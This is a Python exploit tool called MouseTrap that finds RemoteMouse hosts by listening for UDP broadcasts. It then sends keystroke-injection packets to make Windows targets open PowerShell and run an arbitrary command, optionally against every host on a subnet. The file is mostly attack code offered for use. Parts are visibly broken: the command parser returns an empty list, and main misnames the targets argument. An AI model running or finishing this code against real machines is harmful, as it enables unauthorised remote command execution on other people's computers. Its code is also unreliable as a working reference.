"""
MouseTrap - Send exploit payloads to RemoteMouse servers (https://www.remotemouse.net/)
Author: Axel Persinger
License: MIT License
"""


"""
Imported Libraries

argparse - Argument parser library
socket - Socket I/O library to send payloads with
enum - Create special character enum
re - Regex library for parsing commands
time - Sleep for offsets
"""
import argparse
import socket
import enum
import re
import time


"""
Global Variables

re_keycodes - Compiled regex to extract keycodes from commands
"""
re_keycodes = re.compile(r"(\[.*?\])")


class Keycodes(enum.Enum):
    """
    Enum holding the special character keycode string representations
    """
    ENTER = "RTN"
    BAS = "BAS"
    ALT = "ALT"
    CTRL = "CTRL"
    SHIFT = "SHIFT"
    CMD = "CMD"
    WIN = "WIN"
    TAB = "TAB"
    ESC = "ESC"
    HOME = "HOME"
    INSERT = "INSERT"
    DELETE = "DELETE"
    END = "END"
    PAGE_UP = "PAGE_UP"
    PAGE_DOWN = "PAGE_DOWN"
    BACK = "BACK"
    PAUSE = "PAUSE"
    SPACE = "SPACE"
    UP = "UP"
    DOWN = "DOWN"
    LEFT = "LEFT"
    RIGHT = "RIGHT"
    LWIN = "LWIN"
    RWIN = "RWIN"
    F1 = "F1"
    F2 = "F2"
    F3 = "F3"
    F4 = "F4"
    F5 = "F5"
    F6 = "F6"
    F7 = "F7"
    F8 = "F8"
    F9 = "F9"
    F10 = "F10"
    F11 = "F11"
    F12 = "F12"


def _success(msg: str):
    """
    Prints out a SUCCESS msg to the console

    :param msg: msg to display
    :type msg: str
    """
    print("[+] SUCCESS:", msg)


def _info(msg: str):
    """
    Prints out an INFO msg to the console

    :param msg: msg to display
    :type msg: str
    """
    print("[*] INFO:", msg)


def _error(msg: str):
    """
    Prints out an ERROR msg to the console

    :param msg: msg to display
    :type msg: str
    """
    print("[!] ERROR:", msg)


def char2pkt(s: str) -> str:
    """
    Converts an individual character into the full single-character injection packet

    :param s: character to inject
    :type s: str
    :return: packet
    :rtype: str
    """
    i = ord(s) ^ 53
    rhs = "[ras]{}".format(i)
    return "key  {}{}".format(len(rhs), rhs)


def special2pkt(kc: Keycodes) -> str:
    """
    Converts a special character (ENTER, Win, etc.) to a packet.
    This function does NOT validate the special character string is correct.

    :param s: keycode
    :type s: str
    :return: packet
    :rtype: str
    """
    return "key  {}{}".format(len(kc.value), kc.value)


def combo2pkt(s: str, kc: Keycodes) -> str:
    """
    Generates a packet for key combinations (i.e. CTRL+SHIFT+ESC)

    :param s: base key
    :type s: str
    :param kc: modifier keycodes
    :type kc: Keycodes
    :return: [packet
    :rtype: str
    """
    if len(s) != 1:
        s = Keycodes[s].value
    if not isinstance(kc, list):
        kc = [kc]
    modifiers = '[*]'+'[*]'.join([k.value for k in kc])
    rhs = "[kld]{}{}".format(s, modifiers)
    return "key {}{}".format(len(rhs), rhs)


def parse_cmd(s: str) -> list:
    """
    Parse a command and create the injection packets.
    For special characters, wrap the string (That exists inside of Keycodes) inside `[]`.
    For key combinations, warp them inside of `[]` and separate them with `+`.

    :param s: command to execute
    :type s: str
    :return: List of injection ready packets
    :rtype: list
    """
    pkts = []
    special_codes = []
    for m in re.finditer(re_keycodes, s):
        match = m.group()
        s = s.replace(match, '{}')
        keycodes = match[1:-1].split('+')
        special_codes += [special2pkt]
    
    return pkts


def discover_targets() -> list:
    """
    Discovers targets by listening to the UDP broadcasts. Listens until it receives SIGINT

    :return: List of IP Addresses
    :rtype: list
    """
    _info("Listening to UDP port 2007 until SIGINT is sent...")
    targets = []
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', 2007))

    try:
        while True:
            host = sock.recv(20).decode('ascii', errors='ignore')[5:]
            ip = socket.gethostbyname(host)
            targets.append(ip)
            _success("Received broadcast from {} ({})".format(ip, host))
    except KeyboardInterrupt:
        pass
    finally:
        return targets



def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--os', type=str, action='store', choices=('MacOS', 'Windows'), required=True, help="Signals what OS the target is running")
    parser.add_argument('--cmd', type=str, action='store', required=True, help="Command to execute")
    # parser.add_argument('--troll', type=str, action='store', choices=('delete',), help="Adds what trolling features you want to implement")
    parser.add_argument('--targets', type=str, action='store', default='-', help="Comma delimited list of targets, '-' if you want to target all IP addresses on the subnet")
    args = parser.parse_args()

    if args.os == 'MacOS':
        raise NotImplementedError("MacOS targets aren't implemented yet")

    if args.targets == '-':
        args.targets = discover_targets()
    else:
        args.targets = args.target.split(',')

    for target in args.targets:
        _info("Executing '{}' against {} running on {}".format(args.cmd, target, args.os))
        cmd_pkts = parse_cmd(args.cmd) # parse_cmd("[WIN+R]powershell.exe[ENTER]{}[ENTER]".format(cmd))
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for pkt in cmd_pkts:
            time.sleep(0.08)
            _info("Sending '{}'".format(pkt))
            sock.sendto(pkt.encode('utf-8'), (target, 1978))


if __name__ == "__main__":
    main()